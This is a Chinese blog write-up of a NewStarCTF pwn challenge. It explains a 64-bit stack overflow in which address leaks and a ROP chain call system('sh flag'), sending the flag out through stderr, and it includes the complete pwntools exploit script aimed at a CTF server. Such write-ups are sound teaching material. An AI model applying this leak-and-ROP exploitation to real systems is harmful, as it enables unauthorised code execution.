---
title: buffer_fly
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- stackoverflow
- linux_trick

---

NewStarCTF，利用了下linux中sh的小技巧
<!-- more -->

64位栈溢出，没开canary，其他都开了。

程序中有system，函数vuln中存在栈溢出漏洞。

```c
ssize_t vuln()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  printf("give me your name: ");
  read(0, buf, 0x20uLL);
  printf("your name: %s\n", buf);
  printf("give me your age: ");
  read(0, buf, 0x20uLL);
  printf("your age: %s\n", buf);
  printf("you are a girl ?\nsusu give me your wechat number: ");
  read(0, buf, 0x40uLL);
  puts("waitting.....");
  sleep(1u);
  close(0);
  close(1);
  return write(2, "hhhhh", 5uLL);
}
```

buf的大小为0x20，有三次的输入机会，前两次都只能输入0x20，最后一次可以输入0x40。

**总体思路就是：先通过前两次输入泄露栈上的内容，最后一次栈溢出调用system函数，执行我们放在栈上的指令。**

因此我们需要泄露两个地址：程序基地址和栈地址。

在调试中可以发现，在buff+0x18的地方有一个nop指令的地址，输入0x18个字节即可泄露出该指令的地址，从而得到程序基地址；而栈地址我们可以通过输入0x20字节泄露出rbp得到。

之后通过pop rdi将“/bin/sh\x00”在栈上的地址（这里要算一下）送到rdi中，调用system函数即可。

然而没这么容易，在return之前有close(0)，close(1)两条指令，程序的输入流和输出流都被关闭了，我们即使get shell了也无法正常输入和输出，我们只能考虑把flag输出到stderr显示出来。

**而linux中有一个sh指令，sh命令是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取。如果读取的内容不是sh命令，那么就会报错，文本中的内容就会一起在stderr中输出。**

exp:

```python
from pwn import*
context(log_level='debug',os='linux',arch='amd64',timeout=1)
elf=ELF("./pwn")
libc=ELF("./libc-2.31.so")
#p=process("./pwn")
p=remote('node4.buuoj.cn',25713)

def debug():
	gdb.attach(p,"b main")
	pause()

padding=0x28

p.recvuntil('give me your name: ')
p.send('a'*0x18)
p.recvuntil('a'*0x18)
elf_addr=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))-0x128b

p.recvuntil("give me your age: ")
p.send('a'*0x20)
p.recvuntil('a'*0x20)
stack_addr=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))
buf_addr=stack_addr-0x30

print("[*]elf_addr: ",hex(elf_addr))
print("[*]stack_addr: ",hex(stack_addr))
print("[*]buf_addr: ",hex(buf_addr))
print("read: ",hex(elf.plt['read']))

#debug()
sys_addr=elf_addr+0x129d# 一开始的时候偏移找错了，找的应该是call system的地址，而不是system函数实际执行的地址。
ret=elf_addr+0x000000000000101a
pop_rdi=elf_addr+0x0000000000001423

p.recvuntil("you are a girl ?\nsusu give me your wechat number: ")
#payload='a'*0x8+p64(pop_rdi)+p64(buf_addr+0x30)+p64(sys_addr)+p64(buf_addr)+p64(leave)+"cat flag >&2"

payload="sh flag\x00".ljust(0x28,'a')+p64(pop_rdi)+p64(buf_addr)+p64(sys_addr)
p.send(payload)

p.interactive()
```